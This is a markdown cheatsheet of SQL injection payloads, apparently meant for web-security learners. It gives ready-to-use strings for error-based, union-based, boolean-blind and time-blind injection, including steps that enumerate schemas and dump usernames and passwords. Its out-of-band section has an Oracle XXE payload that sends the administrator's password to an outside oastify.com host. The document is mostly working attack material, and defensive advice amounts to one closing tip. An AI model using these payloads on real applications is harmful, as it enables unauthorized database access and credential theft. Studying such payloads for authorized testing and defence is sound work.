# SQL Injection (SQLi) Cheatsheet

‚ö†Ô∏è **Alert:** This cheatsheet does not contain syntax for all SQL languages. You can understand the logic from here and apply it by yourself. For exact syntax, visit the [PortSwigger SQLi Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

## What is SQL Injection?

SQL Injection (SQLi) is a vulnerability where an attacker interferes with the SQL queries an application makes to its database. This can lead to unauthorized access, data modification, or even taking control of the server.

---

## Impact of SQL Injection Attacks

1. **Unauthorized Access:** Attacker can access sensitive data like usernames, passwords, and credit card info.  
2. **Data Manipulation:** Attacker can modify, delete, or corrupt data.  
3. **Service Disruption:** Attacker can crash the database or make it unavailable.  
4. **Remote Code Execution:** In severe cases, an attacker can execute commands on the server.

## Types of SQL Injection

---

### In-Band SQL Injection

In-band SQLi happens when the attacker uses the same communication channel to send the attack and receive results. This is the easiest and most common type of SQLi.

- Data is often shown directly on the web page.  
- Easier to exploit compared to other types of SQLi.  
- Two common types of in-band SQLi:  
  - Error-based SQLi  
  - Union-based SQLi  

---

#### 1. Error-Based SQL Injection

This technique makes the database generate an error message, which gives the attacker useful information.

**Payloads:**
```sql 
' AND CAST((SELECT 1) AS int)--  
' AND CAST((SELECT password FROM users LIMIT 1) AS bool)--  
' AND CAST((SELECT password FROM users LIMIT 1 OFFSET 0) AS bool)--  
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--  
```
---

#### 2. Union-Based SQL Injection

This technique uses the `UNION` SQL operator to combine results from two queries into one response.

**Payloads:**  

**Step 1: Check Number of Columns**  
```sql 
' ORDER BY 1--  
' UNION SELECT NULL, NULL-- 
``` 
**Step 2: Check Data Types (if needed)**  
```sql  
' UNION SELECT 'batman', NULL, NULL--  
' UNION SELECT NULL, 'batman', NULL--  
' UNION SELECT NULL, NULL, 'batman'--  
' UNION SELECT 'a', 1 FROM dual--  
```
**Step 3: Find Table Names**  
```sql   
' UNION SELECT table_name, NULL FROM information_schema.tables--  
' UNION SELECT table_name FROM all_tables--  
```
**Step 4: Find Column Names**  
```sql   
' UNION SELECT column_name, NULL FROM information_schema.columns--  
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'--  
' UNION SELECT column_name, NULL FROM all_tab_columns--  
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'users'--  
```
**Step 5: Dump Data**  
```sql  
' UNION SELECT username, password FROM users--  
' UNION SELECT username || ':' || password, NULL FROM users--  
```

### Blind (Inferential) SQL Injection

In blind SQLi, no data is directly shown on the web page. Instead, the attacker observes how the application behaves to infer information.

- Just as dangerous as in-band SQLi.  
- Takes longer to exploit.  
- Two types of blind SQLi:  
  - Boolean-based SQLi  
  - Time-based SQLi  

---

#### 1. Boolean-Based SQL Injection

This technique checks if a condition is true or false by observing different application responses.

**Payloads:** 
```sql  
' AND 1=1--  
' AND (SELECT LENGTH(username) FROM users WHERE username = 'administrator') = 14--  
' AND SUBSTRING((SELECT username FROM users WHERE username = 'administrator'), 1, 1) = 'a'--  

'||(SELECT 'hello')||'  
'||(SELECT '' FROM dual)||'  
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--  
```
---

#### 2. Time-Based SQL Injection

This technique makes the database pause for a set amount of time, which helps determine if a condition is true.

**Payloads:** 
```sql  
'||pg_sleep(10)||'  
'||sleep(10)||'  
'||(SELECT sleep(10))||'  
'||(SELECT pg_sleep(10))||'  

'||(SELECT CASE WHEN ((SELECT LENGTH(username) FROM users WHERE username='administrator')=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)||'  
```

## üß† Advanced Blind SQLi Payloads

**Find Current Database Name:**  
```sql  
SELECT SUBSTRING((SELECT DATABASE()),1,1);  
```
**Display All Databases:**  
```sql 
SELECT SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 4),1,1);  
```
**Find Table Names:**  
```sql 
SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 10),1,1);  
```
**Find Column Names:**  
```sql 
SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 3),1,1);  
```
**Dump Data:**  
```sql  
SELECT SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1);  
```
---

## Out-of-Band SQL Injection

This type of SQLi triggers an out-of-band network connection to a system controlled by the attacker.

- Less common but powerful.  
- Uses protocols like DNS or HTTP.  

**Payloads:**
```sql  
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://1suq662zugex0quam6iqkwqbn2tthj58.oastify.com"> %remote;]>'),'/l') FROM dual--  

' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://' || (SELECT password FROM users WHERE username='administrator') || '.ccs1qhmaery8k1el6h2147am7dd41xpm.oastify.com"> %remote;]>'),'/l') FROM dual--  
```

üß† **Pro Tip:** Always use prepared statements and parameterized queries to prevent SQLi. Tools like [SQLMap](https://sqlmap.org/) can help with automated testing, but understanding the logic here will help you a lot.
